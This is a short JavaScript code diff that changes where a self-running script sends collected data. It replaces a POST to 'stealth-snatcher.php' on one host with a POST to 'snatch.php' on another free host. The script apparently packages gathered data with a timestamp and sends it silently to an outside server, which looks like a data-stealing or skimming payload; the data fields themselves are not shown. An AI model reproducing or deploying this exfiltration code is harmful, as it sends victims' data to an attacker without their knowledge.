@@ -10,9 +10,9 @@
     date: new Date().toISOString()
   };
 
-  fetch('https://islamb3.github.io/stealth-snatcher.php', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify(data)
-  });
+  fetch('https://liontap.42web.io/snatch.php', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify(data)
+});
 })();
